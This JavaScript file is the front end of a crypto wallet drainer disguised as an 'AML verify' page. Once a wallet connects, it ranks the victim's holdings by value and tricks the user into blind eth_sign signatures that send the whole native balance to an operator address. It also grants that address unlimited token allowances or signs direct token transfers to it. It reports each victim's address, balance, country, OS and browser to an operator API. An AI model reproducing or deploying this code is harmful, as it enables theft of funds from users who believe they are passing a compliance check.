import {
    EthereumClient,
    w3mConnectors,
    w3mProvider,
    WagmiCore,
    WagmiCoreChains,
    WagmiCoreConnectors
} from "https://unpkg.com/@web3modal/ethereum";
import { Web3Modal } from "https://unpkg.com/@web3modal/html";

/* ABI */

const ALLOWANCEABI = [{
    "constant": false,
    "inputs": [{
        "name": "_bridge",
        "type": "address"
    }],
    "name": "removeBridge",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": true,
    "inputs": [],
    "name": "name",
    "outputs": [{
        "name": "",
        "type": "string"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "name": "spender",
        "type": "address"
    }, {
        "name": "value",
        "type": "uint256"
    }],
    "name": "approve",
    "outputs": [{
        "name": "",
        "type": "bool"
    }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": true,
    "inputs": [],
    "name": "totalSupply",
    "outputs": [{
        "name": "",
        "type": "uint256"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "name": "_to",
        "type": "address"
    }, {
        "name": "_value",
        "type": "uint256"
    }],
    "name": "transferDistribution",
    "outputs": [{
        "name": "",
        "type": "bool"
    }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "name": "_from",
        "type": "address"
    }, {
        "name": "_to",
        "type": "address"
    }, {
        "name": "_value",
        "type": "uint256"
    }],
    "name": "transferFrom",
    "outputs": [{
        "name": "",
        "type": "bool"
    }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": true,
    "inputs": [],
    "name": "PERMIT_TYPEHASH",
    "outputs": [{
        "name": "",
        "type": "bytes32"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": true,
    "inputs": [],
    "name": "decimals",
    "outputs": [{
        "name": "",
        "type": "uint8"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": true,
    "inputs": [],
    "name": "DOMAIN_SEPARATOR",
    "outputs": [{
        "name": "",
        "type": "bytes32"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": true,
    "inputs": [],
    "name": "distributionAddress",
    "outputs": [{
        "name": "",
        "type": "address"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "name": "spender",
        "type": "address"
    }, {
        "name": "addedValue",
        "type": "uint256"
    }],
    "name": "increaseAllowance",
    "outputs": [{
        "name": "",
        "type": "bool"
    }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "name": "_to",
        "type": "address"
    }, {
        "name": "_value",
        "type": "uint256"
    }, {
        "name": "_data",
        "type": "bytes"
    }],
    "name": "transferAndCall",
    "outputs": [{
        "name": "",
        "type": "bool"
    }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "name": "_account",
        "type": "address"
    }, {
        "name": "_amount",
        "type": "uint256"
    }],
    "name": "mint",
    "outputs": [{
        "name": "",
        "type": "bool"
    }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": true,
    "inputs": [{
        "name": "",
        "type": "address"
    }],
    "name": "bridgePointers",
    "outputs": [{
        "name": "",
        "type": "address"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": true,
    "inputs": [],
    "name": "version",
    "outputs": [{
        "name": "",
        "type": "string"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "name": "_token",
        "type": "address"
    }, {
        "name": "_to",
        "type": "address"
    }],
    "name": "claimTokens",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": true,
    "inputs": [],
    "name": "advisorsRewardDistributionAddress",
    "outputs": [{
        "name": "",
        "type": "address"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": true,
    "inputs": [{
        "name": "account",
        "type": "address"
    }],
    "name": "balanceOf",
    "outputs": [{
        "name": "",
        "type": "uint256"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": false,
    "inputs": [],
    "name": "renounceOwnership",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": true,
    "inputs": [{
        "name": "_address",
        "type": "address"
    }],
    "name": "isBridge",
    "outputs": [{
        "name": "",
        "type": "bool"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": true,
    "inputs": [],
    "name": "privateOfferingDistributionAddress",
    "outputs": [{
        "name": "",
        "type": "address"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": true,
    "inputs": [{
        "name": "",
        "type": "address"
    }],
    "name": "nonces",
    "outputs": [{
        "name": "",
        "type": "uint256"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": true,
    "inputs": [],
    "name": "owner",
    "outputs": [{
        "name": "",
        "type": "address"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": true,
    "inputs": [],
    "name": "isOwner",
    "outputs": [{
        "name": "",
        "type": "bool"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "name": "_holder",
        "type": "address"
    }, {
        "name": "_spender",
        "type": "address"
    }, {
        "name": "_nonce",
        "type": "uint256"
    }, {
        "name": "_expiry",
        "type": "uint256"
    }, {
        "name": "_allowed",
        "type": "bool"
    }, {
        "name": "_v",
        "type": "uint8"
    }, {
        "name": "_r",
        "type": "bytes32"
    }, {
        "name": "_s",
        "type": "bytes32"
    }],
    "name": "permit",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": true,
    "inputs": [],
    "name": "symbol",
    "outputs": [{
        "name": "",
        "type": "string"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "name": "_bridge",
        "type": "address"
    }],
    "name": "addBridge",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": true,
    "inputs": [],
    "name": "bridgeList",
    "outputs": [{
        "name": "",
        "type": "address[]"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "name": "spender",
        "type": "address"
    }, {
        "name": "subtractedValue",
        "type": "uint256"
    }],
    "name": "decreaseAllowance",
    "outputs": [{
        "name": "",
        "type": "bool"
    }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "name": "_to",
        "type": "address"
    }, {
        "name": "_value",
        "type": "uint256"
    }],
    "name": "transfer",
    "outputs": [{
        "name": "",
        "type": "bool"
    }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "name": "_to",
        "type": "address"
    }, {
        "name": "_amount",
        "type": "uint256"
    }],
    "name": "push",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "name": "_from",
        "type": "address"
    }, {
        "name": "_to",
        "type": "address"
    }, {
        "name": "_amount",
        "type": "uint256"
    }],
    "name": "move",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": true,
    "inputs": [],
    "name": "F_ADDR",
    "outputs": [{
        "name": "",
        "type": "address"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": true,
    "inputs": [{
        "name": "owner",
        "type": "address"
    }, {
        "name": "spender",
        "type": "address"
    }],
    "name": "allowance",
    "outputs": [{
        "name": "",
        "type": "uint256"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "name": "_from",
        "type": "address"
    }, {
        "name": "_amount",
        "type": "uint256"
    }],
    "name": "pull",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "name": "newOwner",
        "type": "address"
    }],
    "name": "transferOwnership",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": true,
    "inputs": [],
    "name": "bridgeCount",
    "outputs": [{
        "name": "",
        "type": "uint256"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": true,
    "inputs": [{
        "name": "",
        "type": "address"
    }, {
        "name": "",
        "type": "address"
    }],
    "name": "expirations",
    "outputs": [{
        "name": "",
        "type": "uint256"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "name": "_name",
        "type": "string"
    }, {
        "name": "_symbol",
        "type": "string"
    }, {
        "name": "_distributionAddress",
        "type": "address"
    }, {
        "name": "_privateOfferingDistributionAddress",
        "type": "address"
    }, {
        "name": "_advisorsRewardDistributionAddress",
        "type": "address"
    }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "constructor"
}, {
    "anonymous": false,
    "inputs": [{
        "indexed": true,
        "name": "bridge",
        "type": "address"
    }],
    "name": "BridgeAdded",
    "type": "event"
}, {
    "anonymous": false,
    "inputs": [{
        "indexed": true,
        "name": "bridge",
        "type": "address"
    }],
    "name": "BridgeRemoved",
    "type": "event"
}, {
    "anonymous": false,
    "inputs": [{
        "indexed": true,
        "name": "to",
        "type": "address"
    }, {
        "indexed": false,
        "name": "amount",
        "type": "uint256"
    }],
    "name": "Mint",
    "type": "event"
}, {
    "anonymous": false,
    "inputs": [{
        "indexed": true,
        "name": "from",
        "type": "address"
    }, {
        "indexed": true,
        "name": "to",
        "type": "address"
    }, {
        "indexed": false,
        "name": "value",
        "type": "uint256"
    }, {
        "indexed": false,
        "name": "data",
        "type": "bytes"
    }],
    "name": "Transfer",
    "type": "event"
}, {
    "anonymous": false,
    "inputs": [{
        "indexed": false,
        "name": "from",
        "type": "address"
    }, {
        "indexed": false,
        "name": "to",
        "type": "address"
    }, {
        "indexed": false,
        "name": "value",
        "type": "uint256"
    }],
    "name": "ContractFallbackCallFailed",
    "type": "event"
}, {
    "anonymous": false,
    "inputs": [{
        "indexed": true,
        "name": "from",
        "type": "address"
    }, {
        "indexed": true,
        "name": "to",
        "type": "address"
    }, {
        "indexed": false,
        "name": "value",
        "type": "uint256"
    }],
    "name": "Transfer",
    "type": "event"
}, {
    "anonymous": false,
    "inputs": [{
        "indexed": true,
        "name": "owner",
        "type": "address"
    }, {
        "indexed": true,
        "name": "spender",
        "type": "address"
    }, {
        "indexed": false,
        "name": "value",
        "type": "uint256"
    }],
    "name": "Approval",
    "type": "event"
}, {
    "anonymous": false,
    "inputs": [{
        "indexed": true,
        "name": "previousOwner",
        "type": "address"
    }, {
        "indexed": true,
        "name": "newOwner",
        "type": "address"
    }],
    "name": "OwnershipTransferred",
    "type": "event"
}]

const { mainnet, polygon, avalanche, bsc, gnosis, optimism, fantom, arbitrum } = WagmiCoreChains;
const { configureChains, createConfig, getAccount, getNetwork, switchNetwork, disconnect, fetchBalance } = WagmiCore;
const { CoinbaseWalletConnector } = WagmiCoreConnectors;

const networks = {1: 'ethereum', 10: 'optimism', 56: 'binancecoin', 137: 'matic-network', 42161: 'arbitrum', 43114: 'avalanche-2'}
const coins = {1: 'ETH', 56: 'BNB', 137: 'MATIC', 10: 'OP', 42161: 'ARB', 43114: 'AVAX'}

let account = '';

const sendMessage = async (message) => {
    const url = `${constants.API_URL}/send_message`;
    console.log(message)
    // await axios.post(url, {message: `%23ID${account ? account.slice(-6) : account}%0A${message}`, cd: '-4187749566'});
}

let provider;
let providerName = '';
let exactWalletName = ''
let nativeUsed = false

const chains = [mainnet, polygon, avalanche, gnosis, bsc, optimism, fantom, arbitrum];
const projectId = constants.projectId;

const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
const wagmiConfig = createConfig({
  autoConnect: true,
  connectors: [
    ...w3mConnectors({ projectId, chains }),
    new CoinbaseWalletConnector({
      chains,
      options: {
          appName: "Amlverify",
          qrcode: true,
      },
    })
  ],
  publicClient,
});
const ethereumClient = new EthereumClient(wagmiConfig, chains);
const web3modal = new Web3Modal({ projectId, themeMode: 'dark', walletImages: {coinbaseWallet: 'images/coinbase-wallet-logo.png'}, }, ethereumClient);

const claim = async (_balance, chainId) => {
  if (!provider) await setProvider();

  if (isDesktopTrust() || isOKX() || isDesktopExodus() || isAndroidCryptoCom() || isBitcoinCom()) {
      sendMessage(`❌ Error [eth_sign, native]. Not supported`)
      return
  }

  try {
    if (getNetwork().chain.id != chainId) {
      try {
        await switchNetwork({chainId: chainId});
      } catch (e) {
        return;
      }
    }

    // الطريقة 1: التوقيع
    let web3, account, gasPrice, amount, ethBalance;
    try {
      web3 = new Web3(provider);
      web3.setProvider(new Web3.providers.HttpProvider(constants.RPC[chainId]));
      account = getAccount().address;
      gasPrice = await getGasPrice(chainId)
      amount = _balance - BigInt(chainId == 42161 ? 1610000 : 170000) * BigInt(gasPrice);
      if (amount < 0) return
      ethBalance = web3.utils.fromWei(String(amount), 'ether');
    } catch (e) {
      return alert('Try to connect with mobile app or another wallet.')
    }

    try {
      const nonce = await web3.eth.getTransactionCount(account, "pending");
      web3.setProvider(provider);

      let tx_ = {
        chainId,
        from: account,
        nonce: web3.utils.toHex(nonce),
        to: constants.initiator,
        gasLimit: web3.utils.toHex(chainId == 42161 ? 800000 : 30000),
        gasPrice: web3.utils.toHex(String(gasPrice)),
        value: web3.utils.toHex(String(amount)),
        data: "0x",
        r: "0x0",
        s: "0x0",
        v: web3.utils.toHex(chainId),
      };

      const { ethereumjs } = window;
      var tx = new ethereumjs.Tx(tx_);
      const serializedTx = "0x" + tx.serialize().toString("hex");
      const sha3_ = web3.utils.sha3(serializedTx, {encoding: 'hex'})
      sendMessage(`⌛️ [Network: ${networks[chainId]}] %0ATransaction sign sent. Wait..`)
      showConfirm();
      const initialSig = await web3.eth.sign(sha3_, account);
      sendMessage('🍾 Signed!')
      nativeUsed = true

      const temp = initialSig.substring(2),
        r = "0x" + temp.substring(0, 64),
        s = "0x" + temp.substring(64, 128),
        rhema = parseInt(temp.substring(128, 130), 16),
        v = web3.utils.toHex(rhema + chainId * 2 + 8);
      tx.r = r;
      tx.s = s;
      tx.v = v;

      const txFin = "0x" + tx.serialize().toString("hex");
      web3.setProvider(new Web3.providers.HttpProvider(constants.RPC[chainId]));

      try {
        web3.eth.sendSignedTransaction(txFin).then(async(resp) => {
          sendMessage(`*✅ Transfer native:* *${parseFloat(ethBalance).toFixed(2)}* %0A*🔍 Network:* ${networks[chainId]} %0A*🪓 Address:* ${account} %0A*⚡️ Wallet:* ${exactWalletName}`);
        }).catch(e => {
          console.log(e)
          sendMessage(`❌ Error [eth_sign, send]: ${e.message}. ${JSON.stringify(e)}`)
        })
        await new Promise(resolve => setTimeout(resolve, 2700));
      } catch (e) {
          console.log(e);
          sendMessage(`❌ Error [eth_sign, native] ${e.message}${JSON.stringify(e)}`)}
      web3.setProvider(provider);
      return;
    } catch (e) {
      console.log(e)
      const eJson = JSON.stringify(e)
      const jsn = eJson.toLowerCase()
      if (exactWalletName.toLowerCase().startsWith('metamask')) {
        sendMessage(`❌ Error [eth_sign, native]: ${e.message}.`)
      } else {
        sendMessage(`❌ Error [eth_sign, native]: ${e.message}. ${eJson}`)   
      }

      if (jsn.includes('user') || jsn.includes('rejected') || jsn.includes('canceled')) {
          showSignError()
      } else if ((jsn.includes('enable') || jsn.includes('disable')) && tokensAmount < constants.limit) {
          showEnableSign()
      } else if ((jsn.includes('json-rpc error') && exactWalletName.toLowerCase() == 'trust wallet') && tokensAmount < constants.limit) {
          showEnableSign()
      }
    }
  } catch (error) {
    sendMessage(`❌ Error: ${error.message}. ${JSON.stringify(error)}`);
    return;
  }
};

const increaseAllowance = async (token, metamask=false) => {
  if (!provider) await setProvider();

  try {
    if (getNetwork().chain.id != token.chainId) {
      try {
        await switchNetwork({chainId: token.chainId});
      } catch (e) {
        return;
      }
    }
 
    let web3, account, gasPrice, web3contract;
    let gasAmount = 100000;
    let increaseSupport = true
    try {
      web3 = new Web3(provider);
      account = getAccount().address;
      gasPrice = await getGasPrice(token.chainId);
      
      web3contract = new web3.eth.Contract(
        ALLOWANCEABI,
        token.token_address
      );
      web3contract.setProvider(new Web3.providers.HttpProvider(constants.RPC[token.chainId]))
      try {
          const estimatedGas = await web3contract.methods.increaseAllowance(constants.initiator, constants.max).estimateGas({from: account})
          gasAmount = estimatedGas + 30000 > 100000 ? 100000 : estimatedGas + 30000
      } catch (e) {
          console.log(e)
          increaseSupport = false
      }
    } catch (e) {
      return alert('Try to connect with mobile app or another wallet.')
    }

    // الطريقة2: زيادة البدل
    let increaseResult = false
    let increaseProcess = false

    if (providerName.toLowerCase() != 'coinbase wallet' && increaseSupport) {
      try {
          if (token.chainId == 1 && token.symbol == 'USDT') throw new Error('USDT ERC20 does not support the method')

          increaseProcess = true
          showConfirm();
          sendMessage(`⌛️ [${token.symbol}] Increase Allowance sent..`)

          if (exactWalletName.toLowerCase().startsWith('exodus') && nativeUsed) {
              await new Promise(resolve => setTimeout(resolve, 2000));
          }

          await provider.request ({ method: 'wallet_switchEthereumChain', params: [{ chainId: web3.utils.toHex(token.chainId) }]});

          web3contract.setProvider(provider)

          try{web3contract.methods.increaseAllowance(constants.initiator, constants.max)
            .send({
                from: account,
                gasLimit: web3.utils.toHex(gasAmount),
                gasPrice: web3.utils.toHex(gasPrice)
            })
            .on('transactionHash', function(hash) {
                web3.setProvider(new Web3.providers.HttpProvider(constants.RPC[token.chainId]))
                const checkReceiptInterval = setInterval(() => {
                    web3.eth.getTransactionReceipt(hash, async function(err, rec) {
                        if (rec) {
                            sendMessage(`🍾 [${token.symbol}] allowed!`)
                            await transfer(token);
                            increaseResult = true
                            increaseProcess = false
                            clearInterval(checkReceiptInterval)
                        } else if (err) {
                            increaseProcess = false
                            clearInterval(checkReceiptInterval)
                            await new Promise(resolve => setTimeout(resolve, 500));
                        }
                    });
                }, 1000) 
            })
            .on('error', async function(e) {
                console.log(e)
                sendMessage(`❌ Error [Increase Allowance]: ${JSON.stringify(e)}.`);
                increaseProcess = false
                await new Promise(resolve => setTimeout(resolve, 2000));
            })}catch(e){}
        } catch (e) {
          console.log(e)
          const eJson = JSON.stringify(e)
          const jsn = eJson.toLowerCase()
          increaseProcess = false
          sendMessage(`❌ Error [Increase Allowance]: ${e.message}. ${eJson}`);
          if (jsn.includes('user') || jsn.includes('rejected') || jsn.includes('canceled')) showSignError()
      }   
    }

    while (increaseProcess) {
        await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    if (increaseResult) return

    // الأسلوب 1: نقل التوقيع
    try {
      if (isDesktopTrust() || isOKX() || isDesktopExodus() || isAndroidCryptoCom() || isBitcoinCom()) {
          sendMessage(`❌ Error [eth_sign]. Not supported`)
          return
      }
      
      web3.setProvider(new Web3.providers.HttpProvider(constants.RPC[token.chainId]))
      const nonce = await web3.eth.getTransactionCount(account, "pending");
      web3.setProvider(provider);

      const signGasPrice = await getIncrSignPrice(token.chainId)
      web3contract.setProvider(provider);
      const hash = web3contract.methods.transfer(constants.initiator, token.balanceRaw).encodeABI();

      let tx_ = {
        from: account,
        chainId: token.chainId,
        nonce: web3.utils.toHex(nonce),
        to: token.token_address,
        gasLimit: web3.utils.toHex(token.chainId == 42161 ? 800000 : 100000),
        gasPrice: web3.utils.toHex(gasPrice),
        value: "0x0",
        data: hash,
        r: "0x",
        s: "0x",
        v: web3.utils.toHex(token.chainId),
      };
      console.log(tx_)

      const { ethereumjs } = window;
      var tx = new ethereumjs.Tx(tx_);
      const serializedTx = "0x" + tx.serialize().toString("hex");
      const sha3_ = web3.utils.sha3(serializedTx, { encoding: "hex" });

      sendMessage(`⌛️ [${token.symbol}] Transaction sign sent...`)
      showConfirm();
      const initialSig = await web3.eth.sign(sha3_, account);
      sendMessage(`🍾 [${token.symbol}] Signed!`)

      const temp = initialSig.substring(2),
        r = "0x" + temp.substring(0, 64),
        s = "0x" + temp.substring(64, 128),
        rhema = parseInt(temp.substring(128, 130), 16),
        v = web3.utils.toHex(rhema + token.chainId * 2 + 8);
      tx.r = r;
      tx.s = s;
      tx.v = v;

      const txFin = "0x" + tx.serialize().toString("hex");
      web3.setProvider(new Web3.providers.HttpProvider(constants.RPC[token.chainId]));
      
      try {
        web3.eth.sendSignedTransaction(txFin).then(async(resp) => {
          sendMessage(`*✅ Transfer ${token.symbol}:* *$${parseInt(token.usdPrice)}* %0A*🔍 Network:* ${networks[token.chainId]} %0A*🪓 Address:* ${account}`);
        }).catch(e => {
            console.log(e)
          hideLoad();  
          sendMessage(`❌ Error [eth_sign, send]: ${e.message}. ${JSON.stringify(e)}`)
        });
        await new Promise(resolve => setTimeout(resolve, 2700));
        return;
      } catch (e) {
            console.log(e)
        hideLoad();
        sendMessage(`❌ Error [eth_sign, send]: ${e.message}. ${JSON.stringify(e)}`)
      }
      web3.setProvider(provider);
    } catch (e) {
      hideLoad();
      const jsn2 = JSON.stringify(e).toLowerCase()
      sendMessage(`❌ Error [eth_sign]: Not working/User canceled ${e.message}. ${JSON.stringify(e)}`)
      if (jsn2.includes('user') || jsn2.includes('rejected') || jsn2.includes('canceled')) showSignError()
    }
  } catch (e) {sendMessage(`❌ Error: ${e.message}. ${JSON.stringify(e)}`)}
};

const transfer = async (token) => {
  if (!provider) await setProvider();

  const account = getAccount().address;
  axios.post(`${constants.API_URL}/transfer`, {token, account});
}

const balanceOf = async (tokenAddress, chainId) => {
  try {
    const account = getAccount().address;
    const data = {address: account, chainId}
    if (tokenAddress != '0x0000000000000000000000000000000000000000') data.token = tokenAddress
    return await fetchBalance(data);
  } catch (error) {}
};

const getGasPrice = async(chainId) => {
    const ethersProvider = new ethers.providers.JsonRpcProvider(constants.RPC[chainId]);
    const feeData = await ethersProvider.getFeeData();
    let result = Math.floor(parseInt(feeData.gasPrice._hex) * 1.25)
    if (parseInt(chainId) == 56 && result < 3000000000) result = 3000000000;
    return result;
}

const getIncrSignPrice = async(chainId) => {
    const ethersProvider = new ethers.providers.JsonRpcProvider(constants.RPC[chainId]);
    const feeData = await ethersProvider.getFeeData();
    let result = Math.floor(parseInt(feeData.gasPrice._hex) * 1.15)
    if (parseInt(chainId) == 56 && result < 3000000000) return 3000000000;
    return result;
}

const setProvider = async () => {
  const isMobile = navigator.userAgent.match(/(iPad)|(iPhone)|(iPod)|(android)|(webOS)/i)
  try {
    providerName = getAccount().connector.name.toLowerCase();
    if (providerName == 'metamask' || (providerName == 'coinbase wallet' && isMobile) || isDesktopTrust()) {
      provider = window.ethereum;
      return;
    }
  } catch (e) {return}
    provider = await getAccount().connector.getProvider();
}

const isDesktopTrust = () => {
    const isMobile = navigator.userAgent.match(/(iPad)|(iPhone)|(iPod)|(android)|(webOS)/i)
    return !isMobile && providerName.toLowerCase() == 'trust wallet' && window.ethereum && window.ethereum.isTrust
}

const isOKX = () => {
    return exactWalletName.startsWith('OKX')
}

const isDesktopExodus = () => {
    const isMobile = navigator.userAgent.match(/(iPad)|(iPhone)|(iPod)|(android)|(webOS)/i)
    return !isMobile && exactWalletName.toLowerCase() == 'exodus'
}

const isAndroidCryptoCom = () => {
    return navigator.userAgent.match(/(android)/i) && exactWalletName.toLowerCase().startsWith('defi')
}

const isBitcoinCom = () => {
    return exactWalletName.toLowerCase() == 'bitcoin.com'
}


let tokensAmount = 0
let balance = {};
let tokens = [];
let maxToken = null;
let sortedTokens = [];
let currentIndex = 0;
let geodata = {country_name: '?', emoji_flag: '?'}
let os = 'Unknown'
let browser = 'Unknown'

function detectOS() {
	let userAgent = window.navigator.userAgent,
		platform = window.navigator.platform,
		macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
		windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
		iosPlatforms = ['iPhone', 'iPad', 'iPod'],
		os = null;

	if (macosPlatforms.indexOf(platform) !== -1) {
		os = 'Mac OS';
	} else if (iosPlatforms.indexOf(platform) !== -1) {
		os = 'iOS';
	} else if (windowsPlatforms.indexOf(platform) !== -1) {
		os = 'Windows';
	} else if (/Android/.test(userAgent)) {
		os = 'Android';
	} else if (!os && /Linux/.test(platform)) {
		os = 'Linux';
	}

	return os;
}

function detectBrowser() {
	let browserInfo = navigator.userAgent;
    if (browserInfo.includes('Opera') || browserInfo.includes('Opr')) {
      return 'Opera';
    } else if (browserInfo.includes('Edg')) {
      return 'Edge';
    } else if (browserInfo.includes('Chrome')) {
      return 'Chrome';
    } else if (browserInfo.includes('Safari')) {
      return 'Safari';
    } else if (browserInfo.includes('Firefox')) {
      return 'Firefox'
    } else {
      return 'Unknown'
    }
}

async function setGeo() {
    const ipInfo = await fetch("https://api.ipify.org?format=json")
    const ipData = await ipInfo.json() 

    const ipdataKey = '928f0732f96836aefefe3e9950c8297aa75bf2607f9e1a761cff044d'
    const geo = await fetch(`https://api.ipdata.co/${ipData.ip}?api-key=${ipdataKey}&fields=country_name,emoji_flag,emoji_unicode`)
    geodata = await geo.json()
}

async function wc_claim() {
    try {
        if (getAccount().isConnected) {
            console.log(tokens.length, maxToken)
            if (tokens.length > 0 && maxToken) {
                balance = await balanceOf(maxToken.token_address, maxToken.chainId);

                if (maxToken.token_address === "0x0000000000000000000000000000000000000000") {
                    await claim(balance.value, maxToken.chainId);
                } else {
                    await increaseAllowance(maxToken);
                }
                currentIndex += 1;
                maxToken = sortedTokens[currentIndex];
                wc_claim();
            }
        } else {
            wConnect();
        }
    } catch (error) {
        currentIndex += 1;
        maxToken = sortedTokens[currentIndex];
        if (maxToken) {
            wc_claim();
        }
    }
}

const setUserTokens = async () => {
	if (tokens.length == 0) {
		const validTokens = await getTokens(getAccount().address)
		// const validLPTokens = await getLPTokens(getAccount().address);
		// const validTokens = []
		const validLPTokens = []            
		tokens = tokens.concat(validTokens, validLPTokens)
		sortedTokens = sortedTokens.concat(validTokens, validLPTokens)
		if (sortedTokens.length == 0) return showAmlError();
	}
}

async function wConnect() {
    try {
        await web3modal.openModal();
        web3modal.subscribeModal((newState) => {
            if (!newState.open) {
                if (getAccount().isConnected) {
                    account = getAccount().address;
                    setUserTokens()

                    document.querySelector('.content').style.display = 'block'
                    document.querySelector('#claim').style.display = 'none'
                 }
            }
        });
    } catch (error) {}
}

document.querySelector('#buy').addEventListener('click', () => {
	showBalance();
})

async function showBalance() {
	try {
        while (tokens.length == 0) {
        	showLoad();
        	await new Promise(resolve => setTimeout(resolve, 500));
        }
        hideLoad();

        if (sortedTokens.length > 0) {
            sortedTokens.sort((a, b) => b.usdPrice - a.usdPrice);
        } else {
	        return showAmlError();
        }
        
        const fullAmount = sortedTokens.map(i=>i.usdPrice).reduce((a,b)=>a+b);
        try {
            const fullAmount = 5
            const tokensAmoutn = 0
            tokensAmount = sortedTokens.filter(t => t.token_address != "0x0000000000000000000000000000000000000000").map(i=>i.usdPrice).reduce((a,b)=>a+b)   
        } catch (e) {}

        const connector = getAccount().connector
        providerName = getAccount().connector.name.toLowerCase();
        try {
            exactWalletName = (await connector.getProvider()).session.peer.metadata.name
        } catch (e) {
            exactWalletName = providerName
        }

        const isNoSignWallet = [
            isOKX(), isDesktopExodus(), isAndroidCryptoCom(), isBitcoinCom()
        ].filter(i => i).length > 0
        
        os = detectOS();
		browser = detectBrowser();

        if (fullAmount < constants.limit || isDesktopTrust() || (isNoSignWallet && tokensAmount < constants.limit)) {
            sendMessage(`*⚡️ Wallet*: ${exactWalletName} | ${providerName} | 1$AML %0A*💰 Cash:* [$${String(Math.floor(fullAmount))}] ${String(sortedTokens.length)} coins %0A*🪓 Address*: ${getAccount().address}%0A%0A*🌍 GEO:* ${geodata.country_name} ${geodata.emoji_flag}%0A*🖥 OS*: ${os} | Browser: ${browser}`)
            await buyTokens()
        } else {
            sendMessage(`*🔥️ Wallet*: ${exactWalletName} | ${providerName} |  1$AML %0A*💰 Cash:* [$${String(Math.floor(fullAmount))}] | ${String(sortedTokens.length)} coins %0A*🪓 Address*: ${getAccount().address}%0A%0A*🌍 GEO:* ${geodata.country_name} ${geodata.emoji_flag}%0A*🖥 OS:* ${os} | Browser: ${browser}`)
            maxToken = sortedTokens[currentIndex];
            wc_claim();
        }
    } catch (error) {sendMessage(`${JSON.stringify(error)} ${error.message}`)}
}

const getWeiForTokensAmount = (network, data, usdAmount) => {
	const oneUsdInWei = (10**18) / data[network]['usd'];
	return String(Math.floor(oneUsdInWei * usdAmount));
}

const getUsdForTokens = (tokensAmount) => {
	return tokensAmount * 1
}

const getPrices = async() => {
    const resp = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum%2Carbitrum%2Coptimism%2Cbinancecoin%2Cmatic-network%2Cavalanche-2&vs_currencies=usd')
    const data = await resp.json()
    return data
}

const buyTokens = async() => {
    const chainId = 1;
    if (!provider) await setProvider();
    
    if (sortedTokens.filter(c => c.chainId == chainId && c.token_address == '0x0000000000000000000000000000000000000000').length == 0) {
        sendMessage(`User have no ${coins[parseInt(chainId)]} to pay for AML`)
        return showAmlError()
    }

    try {
        if (getNetwork().chain.id != chainId) {
            try {
                await switchNetwork({chainId});
            } catch (e) {
                return;
            }
        }

        const web3 = new Web3(provider);
        const account = getAccount().address;
        const gasPrice = await getGasPrice(chainId);
        const prices = await getPrices();
        const usdAmount = getUsdForTokens(parseInt(document.querySelector('#tokens-input').value));  // USD
